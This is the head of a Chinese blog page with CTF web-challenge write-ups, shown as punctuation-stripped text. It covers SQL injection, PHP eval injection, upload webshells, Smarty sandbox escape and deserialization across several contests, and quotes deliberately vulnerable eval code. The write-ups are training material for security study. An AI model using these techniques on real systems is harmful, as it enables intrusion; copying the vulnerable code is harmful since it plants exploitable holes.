<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>CTF刷题 | hybcx</title><meta name="keywords" content="CTF赛事"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="CTF刷题"><meta name="application-name" content="CTF刷题"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="CTF刷题"><meta property="og:url" content="http://hybcx.xyz/2024/07/14/ctf-shua-ti/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="[XGCTF2024] CodeInject &amp;lt;?php  #Author: h1xa  error_reporting(0); show_source(__FILE__);  eval(&amp;quot;var_dump((Object)$_POST[1]);&amp;quot;); 可以看到接受一个参数1的参数值，然后强转"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="[XGCTF2024] CodeInject &amp;lt;?php  #Author: h1xa  error_reporting(0); show_source(__FILE__);  eval(&amp;quot;var_dump((Object)$_POST[1]);&amp;quot;); 可以看到接受一个参数1的参数值，然后强转"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/14/ctf-shua-ti/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'CTF刷题',
  postAI: '',
  pageFillDescription: '[XGCTF2024], CodeInject, tpdoor, [HUBUCTF 2022 新生赛], checkin, HowToGetShell, Calculate, ezsql, [SDCTF 2022], Apollo 1337, CURL Up and Read, jawt that down!, lots of logs, gullible by dovesign, HuMongous Mistake, [NISACTF 2022], easyssrf, checkin, babyupload, babyserialize, popchains, midlevel, level-up, bingdundun~, middlerce, is secret, join-us, 参考文章, hardsql, 鹏城杯 2022, 简单包含, 简单的php, 参考文章, 压缩包, 红明谷CTF 2022, Smarty Calculator, 参考文章, Fan Website, 参考文章, MoeCTF 2024, Web渗透测试与审计入门指北, 弗拉格之地的入口, ez_http, ProveYourLove, 弗拉格之地的挑战, pop moe, 垫刀之路01 MoeCTF？启动！, ImageCloud前置, 垫刀之路02 普通的文件上传, 垫刀之路03 这是一个图床, 静态网页, 电院_Backend, 勇闯铜人阵, 垫刀之路04 一个文件浏览器, 垫刀之路05 登陆网站, 垫刀之路06 pop base mini moe, BaseCTF 2024, [Week1] HTTP, [Week1] 喵喵喵´•ﻌ•`, [Week1] md5绕过欸, [Week1] A Dark Room, [Week1] upload, [Week1] Aura 酱的礼物可以看到接受一个参数的参数值然后强转为对象接着用函数输出输出对象的结构和内容看着简单但是分析了发现我还是有疑问点首先或者本地测试以下就知道被强转为对象之后输入效果如下因此为了不让我们执行代码的部分被赋值给我们可以想到闭合逃逸最终效果应该如下但是当我尝试改为的时候就不能执行了这里问了给出的解释如下输入结合后的代码解释失败因为是未定义的常量会被解释为字符串并产生错误不执行因为前面的错误导致代码未能继续执行在中如果一个未定义的标识符出现在代码中它会被解释为字符串并产生一个错误例如输出并产生一个错误在你的代码中中的被解释为字符串但会产生一个语法错误导致后续的不能被执行因此我猜测靶场对应的环境就是如此会爆出错误而不能执行后续代码但当我本地测试发现是可以的因为不知道如何考察因此我只能猜测这与不同版本对应的处理也不同有关我的是但靶场的版本我找不到另外看了其他师傅的发现可以直接这样等价效果也就是最后面没有分号结尾也可以正常执行针对结果来看只能认为这是由于执行代码的优先顺序决定的上述等价效果在执行的时候应该是先执行的函数然后将得到的值强转为了对象的解释意思也是如此题目源码如下上述代码就是为文件进行某些配置修改思路可以是关注他修改了哪些值我们可以跟踪这些值的去向或许就有发现首先是信息搜集这里看到我们可以搜一下对应的版本这里我觉得我只能看的一个个找才能找到源码否则真不能根据关键词直接定位这里看到的的含有关键词下载源码看一下全局搜索能看到上图所示位置我们跟踪去向如下图这里判断变量是否为空是空的话就调用函数这里根据信息进行赋值然后返回一个数组继续跟进这里先是判断是否是数组很明显上一步返回的就是数组然后他会填充该数组使得数组的长度一定是随后调用函数我们跟进关闭当前缓存自动缓存功能特殊规则替换缓存某个后缀的请求可以看到上述会先对参数做判断由于这里我们是可控的因此我们可以让其进入到这段代码如果我们给赋值为类似形式那就会进入上述代码然后由分割成为数组然后继续判断最后来到这里简单判断是否存在然后就调用函数传入值很明显这里我们可以构造任意函数来执行命令新生赛刚开始被骗了满足上述条件出不来看了评论知道猜测题目给的就是假的所以考的是弱比较直接赋值为即可知道就是无字母计算题首页发现存在注册和登录功能知道有个用户但不知道密码弱口令不行尝试注册一个用户注册之后发现可以更新自己的个人信息抓包进一步测试同时目录扫描得到源码发现中箭头处存在注入其他的地方都用了作为占位符不能注入这里能知道采用闭合思路不用单引号闭合然后直接跟逗号后面给赋值即可剩下的用注释符注释掉即可不过查询的结果需要跟随重定向才能看到数据库名字为得到密码当然也可以直接尝试修改密码这道题开始也算有思路但是没找到关键于是看了一眼发现还是要仔细看看前端页面交互情况这里直接用插件看到了一个接口当然也可以查看网络模块访问之后如下图所示然后尝试的给参数传参发现不论传什么数据回显如下可以看到有三个路由分别访问看看之后回到路由尝试切换为类型然后发现提示变量未设置那我们设置一下如下图提示我们应该赋值为之后发包提示没有设置变量于是我继续添加发现参数值格式为发送之后说我们的发送时间不对无法看了发现这个平台的题目缺少题目描述这里提到是中午发射火箭我们尝试之后设置变量传值的时候当我们传的不对会提示测试之后发现是可以的这里也调用了的接口最后提示我们设置这里随便输入之后提示我们无效接着我返回前端翻找是否含有果不其然找到了首页一个请求页面输入正确格式然后请求目标网址内容这里先尝试了请求显示内部错误随后看了提示尝试利用伪协议查看环境变量但是发现前端对格式做了限制但同时发现格式被编码为了接着如下图构造以下随机拼接路由得到环境变量首先信息搜集了一波发现前端文件泄露了账号和密码接着按上面的账号登陆发现页面多了一个的超链接不过访问的时候显示找不到过了几秒在访问显示无效尝试点击这个超链接的时候抓包如下图存在解密一下发现从签发时间到过期时间只有秒但我们又破解不出来同时复现的时候题目感觉有点问题没啥思路只能看发现题目似乎的确有问题当我点击超链接的时候却是拼接的小写根据我在登录之后迅速拼接大写得到下图回显这里做多了能想到利用发包不断登录不断回显这里也有点脑洞回显的字符应该与上一个字符进行拼接形成目录这样的形式这样的话写脚本思路也就清晰了题目给了两个网址第二个访问不了访问第一个发现里面除了能看到一些日志其余也没啥信息了看了发现原来是观察可以看到这里的目录很有结构规律这里就可以尝试脚本自动化爬取其中的信息了也是马后炮才得知第二个网址是用来的链接上去发现要提供密码这道题考察的就是分析日志的能力了说实话这么多日志思路估计也就是找之类的字眼不过要是能知道第二个网址是要的也就知道这里的找密码了同时命令熟悉的话更简便了网站有文件上传的功能同时也提示我们很强然后我显示网上找了几个的图片发现不能识别于是我尝试下载本网站已经上传的图片发现可以识别成功经过对比和的提示可以看到这个是检测元数据内容的如下图如果元数据有鸟的名字就能正常识别了随即也测试了可以上传等后缀他没有检测但是却不能知道文件路径也无法猜测的随即尝试对图片名字测试发现输入单引号爆出错误明显的注入了网上找打上图可以确定含有三列接下来找回显位确定回显位是然后找表明如下图是三个这里直觉选择最后在中找到这道题目还得用到那个官方的服务器由于我不知道咋找索性只看个思路了这题的入手点是一个的注入参考文章如下注入注入指北注入从零到一用到的思路是数组注入类似上述那个网站在登陆的时候存在用户但是我们不知道密码但却知道这是数据库于是我们构造类似上述的是已知的那么重点关注了最终再尝试下猜测服务器只检查长度大小于是向添加了长度属性成功绕过后面似乎就是用户身份验证问题了根据页面提示当使用伪协议发现回显明显不同尝试之后回显换个其他路径然后尝试读取根目录的发现如下图让我们查看如上图得到提示访问之后代码如下你败了如果参数含有字符则无法正常读取文件尝试目录穿越得到不过伪协议也可以代码看着简单但当你传参完之后发现不能回显接着我尝试鼠标复制这些参数值发现光标不能正常跟着鼠标位置走凭经验直接全部然后用打开果然看到了特殊的编码最简单的办法看学到的直接查看源代码找到正确位置双击然后右键复制即可随后复制完直接放进上方地址中点击发送之后会自动编码拿着编码后的结果重新用发送将其中的额外字符删掉没见过的考点中的处理文件上传绝对路径拼接漏洞函数用于将多个文件路径连接成一个组合的路径第一个函数通常包含了基础路径而之后的每个参数被当作组件拼接到基础路径之后然而这个函数有一个少有人知的特性如果拼接的某个路径以开头那么包括基础路径在内的所有前缀路径都将被删除该路径将视为绝对路径函数用于将多个文件路径连接成一个组合的路径第一个函数通常包含了基础路径而之后的每个参数被当作组件拼接到基础路径之后然而这个函数有一个少有人知的特性如果拼接的某个路径以开头那么包括基础路径在内的所有前缀路径都将被删除该路径将视为绝对路径题目给的关键代码如下可以看到这里的问题如果我们传入的文件名是那之前的基础路径就会被删除直接从开始如下图成功读取链子很容易走通不过就是最后的绕了这里被过滤了如果你仔细看的话会发现上图这里没有检测大小写那我们尝试大写看看如下图成功绕过链子如下一开始根据提示读取啥反应没有看了发现都是在读估计是环境部署问题根据直接读取看源代码提示知道是访问接着强碰撞绕过得到第三关接着强碰撞绕过这一关是变量解析绕过稍微总结一下需要将所有参数转换为有效的变量名因此在解析查询字符串时它会做两件事删除空白符将某些字符转换为下划线包括空格很明显可以绕过这个绕过方法忘记了总的来说先说正则表达式的含义他匹配的是整个字符串因此只要不满足以下条件的任意一个即可绕过字符串只能包含大小写字母和数字和下划线字符串可以为空字符串的开始和结束位置都必须满足这个字符类的限制因此可以是构造思路是函数会在内部执行我们发现是执行了后面的语句属于中的第二个参数位置因此闭合表达式的然后注释符注释掉其他文件上传文件包含题目提示我们只能上传压缩包或者图片这里也是看了知道是协议其实结合题目的可以上传压缩包类型文件也可以猜到由于存在文件包含那我们直接构造一个压缩包文件内容如下随后压缩成压缩包上传得到的路径用伪协议读取如下图所示至于为何这里后面只添加了是因为题目代码会自动加上再加把油喔一个是绕过正则另一个是要符合数据的格式正则的话见多了就知道这里是回溯次数限制绕过为了防止正则表达式的拒绝服务攻击给设定了一个回溯次数上限默认超过不会返回或而是即超过限制即可脚本如下首页让你找扫目录看一下访问发现可以给传参然后胡乱传参报错看到下面的部分源码经过的解密然后加密在经过的过滤随后进行模板渲染加密脚本如下加密主函数我这里没管秘钥小于的情况小于不断重复填充即可原来的盒混乱后的盒调用加密程序成功用于加密字符串加密后是加密后的字符串是加密后的输出经过编码需要加密的字符串在这里修改注入点就是登录框抓包后尝试添加单引号发现抱错说明存在注入了回显与相同说明是单引号闭合由于了一波发现给了尝试找一个不存在的表名如下图得到数据库名字接下来就好办了接下来就是找列名了但是被了能找到无列名注入原理是用连接两张表时遇到重复的列名会报错并把这个报错的列名显示出来找到列名接下来输出内容在此只有一个列名的情况下直接查也可同时由于回显不全得利用截断字符但只有没有被参考文章无列名注入的几种方式题目给出提示如上尝试抓包进行注入的时候提示我们用户名只能是那说明只能给注入了根据提示能猜到这里是个空表那我们只能让查询的结果与输入的结果一致才行那就能想到注入了参考文章可以看下面这个复现最后就是上面这个只不过原本是但被了查询可以知道与三者等价鹏城杯简单包含首先给出源码如上当我尝试直接读取发现有那我们读一下得到下面的代码因为他这里是条件那如果我们的数据大于那语句直接就是绕过的正则匹配也就是要我们添加脏数据简单的针对第一个语句如果我们的代码长度在以内并且不包含任何数字字母以及特殊字符即可绕过正则到达第二个语句针对第二个语句的正则正则表达式匹配一个或多个非非单词字符即匹配一个或多个单词字符相当于匹配一个左括号递归地匹配整个正则表达式本身这意味着它会匹配嵌套的括号对匹配一个右括号这个函数将匹配正则表达式的部分替换为空字符串也就是说我们只能使用不带参数的函数这样才能匹配正则执行代码前置知识被用作内部函数之间的隔离符这是因为在编码中通常是被认为是无效字符的因为它超出了字符集的范围因此使用作为隔离符可以确保函数调用中的字符不会被错误地解析或转换同理可以使用的也有等字符集的范围提交即可参考文章的无参数从挑战中学习无字母数字构造压缩包转换为小写去除字符串收尾去空总体来说就是对上传的压缩包进行解压然后删除其中不合法文件最后移动完上传的文件然后删除该文件所在临时目录基于这一点我们可以采用条件竞争或者上传一个不合法损坏的压缩包这样就不会进入语句而被删除但却没有复现成功红明谷首先扫描目录发现源码打开之后先看可以看到这里有个过滤了字符然后当我们的和参数都存在即可进行的模板渲染那首先获取一下当前版本接着尝试搜索相关发现还是存在漏洞的这里找到官方源码与题目给的进行对比看看去下载源文件可以看到这里对正则的表达式进行了修改问一下发现题目给的正则表达式匹配情况如下这个正则表达式要求字符串至少以一个中的字符开头然后可以跟随任意字符包括空字符串直到字符串的结尾匹配的字符串不匹配的字符串这意味着我们可以通过进制绕过不过在此之前还有很多绕过方式如下图再结合上述正则表达式我们需要绕过正则否则会进入因为匹配除了换行符以外的所有字符匹配次或者多次匹配一次或者多次所以可以换行绕过既不在前面的匹配里面又不被后面的匹配所以我们只需要在原来的基础上加上回车绕过即可执行剩下就是找这道题没有在根目录反而在至于我看到很多说这里还进行了和的限制不过我们只需要绕过即可我上面由于直接调用的并不是用的的函数因此没有限制还有其他师傅的绕过注意这个文件首先定义了很多有效函数然后对其中里的做了一些判断然后如下图所示经过正则的匹配拼接到了函数中但我们可以用八进制来绕过借用师傅的脚本如上图所示成功利用接下来直接写文件蚁剑连接即可除此之外还有一种复杂的利用方式具体可以参考第四篇文章这个是可以复现成功的针对进一步的话应该还是要写文件当我我直接没反应现在反应过来是和参考文章红明谷漏洞利用实例红明谷沙箱逃逸这个题目猜测是环境部署问题找不到源码所在因此直接找网上展示的了正常来说能发现审计代码然后能发现下图位置可以发现是框架版本是搜一下能搜到对应的链子这里我选择链子这个框架的路由一般在中所以我们访问一下就可以顺利访问到这个在本题目中目录下有两个文件夹一个是一个是查看白名单设置默认主页添加信息修改信息删除信息白名单反序列化触发点图片上传白名单限制对上传的文件的内容进行限制图片有大小要求图片存放的路径将路径回显可以看到这里有图片上传和删除修改和删除信息等功能而且还看到这里的图片删除存在意味着我们能触发反序列化其中图片上传的限制有图片大小大于并且只能是格式然后不能存在关键词这些还是很好绕过的这里的用命令即可如下后缀名必须为设置将自定义的存入添加要压缩的文件签名自动计算这里尝试了很多次一直失败最后感觉是环境问题也就放弃了如上图正常来说回显路径之后访问路由去触发反序列化按理来说就应该出来根目录了但我不知道为何试了很多次参考文章红明谷红明谷红明谷部分渗透测试与审计入门指北下载附件用小搭建网站即可弗拉格之地的入口看到爬虫二字可以联想到访问访问之后拿到我还以为这是一部分没想到就是最终结果了最终完整数据包如下根据题目描述当表白次数到达的时候才能证明你的爱也就是拿到直接抓包爆破次即可如下图得到弗拉格之地的挑战根据页面提示首先访问然后查看源代码得到还有一部分需要解密恭喜你找到了网页的源代码通常在这里题目会放一些提示做题没头绪一定要先进来看一下下一步恭喜你已经学会了如何查看网页源代码但这还不够这是第二题本题关键词想想服务器通过网络传输过来的除了这个页面还有什么根据提示可以猜测是要查看流量包如下图得到第三关还有第二部分接着访问页面让我们请用方法传入一个参数再用方法传入一个参数你需要使用的身份验证完整数据包如下第三部分访问第四关首先需要修改为指定内容然后根据题目要求让我们根据提示按按钮但是明显没有按钮于是可以修改前端属性让原本为的修改为为的如下图成功得到需要去控制台查看第四部分让我们输入指定内容但是看源码发现不能与指定内容相等想到是页面提交的时候会自动加上符号尝试抓包看看你就这么直接如下图本来原内容中间间隔一个加号去掉之后发现成功第五部分第六关完整答案如下大小写绕过即可第六部分最后读取根目录即可第七部分得到链子思路很简单就是最后一步需要动点脑子可能会一直想如何才能正确给传参当时我忘记考虑但是仔细一看就能知道可以触发这样的话最终的参数内容就靠自身的了然后全局查看即可垫刀之路启动查看环境变量即可前置协议读取指定文件即可垫刀之路普通的文件上传直接上传即可没有任何过滤垫刀之路这是一个图床只能上传格式的图片哦告诉不要处理发送的数据告诉不要设置假设是一个包含文件名的字符串使用分割字符串得到一个数组然后使用获取数组的最后一个元素即后缀名转换为小写以统一比较文件上传都由前端进行校验分析上述代码可以知道在提醒我们可以进行多文件上传而只检测了上传的第一个文件只要我们第一个文件符合上述条件即可第二个文件随意上传静态网页这道题首先是个静态网页那只能扫目录然后测试网站的所有功能以便发现可疑之处不幸的是扫目录并没有什么发现接着就是测试功能了如下图所示这里知道点击换衣服的时候会像后端请求那我们肯定是从这里入手可能就会请求到一些这里我点击换衣服然后抓包也是放包了半天发现两个接口上面这个接口没有测试出来是干嘛的感觉就是请求图片的意思换衣服并且也提示我们请求的地方不正确接着放包发现下面的接口直接尝试发包发现访问即可意思是和不能为数字且弱等于弱等于本地测试即可不难发现可以构造电院源码如下验证验证码验证码错误啦再输入吧不存在邮箱为的管理员账号登陆成功管理员邮箱或密码错误很明显是注入这里肯定无从下手只能对参数进行注入直接闭合然后万能密码即可至于注入点扫目录就能发现勇闯铜人阵明显是让锻炼写脚本根据题目要求会出现一个数字或者是两个数字的情况对应的答案也需要稍微变化先构造好答案之后就是查看元素位置分别需要查看开始按钮选手名字回答问题回答按钮元素位置接着只需要注意第一次回答需要输入弟子明白然后内回答完即可脚本如下方位映射字典北方东北方东方东南方南方西南方西方西北方中央一个初始化打开游戏网页输入选手名字并开始游戏替换为选手的名字输入弟子明白并提交弟子明白等待游戏开始获取状态信息你是上来捣乱的吗回答错误游戏结束提取数字并转换为方向未检测到有效的数字继续等待提交答案等待一下再进行下一轮检测垫刀之路一个文件浏览器目录穿越列出根目录找就行垫刀之路登陆网站比电院更简单的万能密码垫刀之路简单的请求不过在跳转的地方喵喵喵简单绕过欸绕过加密后会变成这个样子第二个数组绕过即可在源码里直接上传木马即可酱的礼物也是想了半天才反应过来酱欢迎回家这里有一份礼物请你签收一下哟这是的礼物你不是礼物收到啦接下来要去博客里面写下感想哦这不是的博客已经收到的礼物啦请去博客里面写下感想哦嘿嘿接下来要拆开礼物啦悄悄告诉你礼物在里面哦首先第一个因为是所以要用伪协议绕过第二个没啥好说的博客地址肯定需要在开头第三个说是一直没反应过来咋利用看了别的师傅的提示发现利用的是解析的漏洞一个的访问实际上是以后为准比如实际上访问的是那这好办了因为当前页面就存在已经收到的礼物啦直接后面写即可绕过最后就是伪协议包含即可',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-22 10:31:47',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" 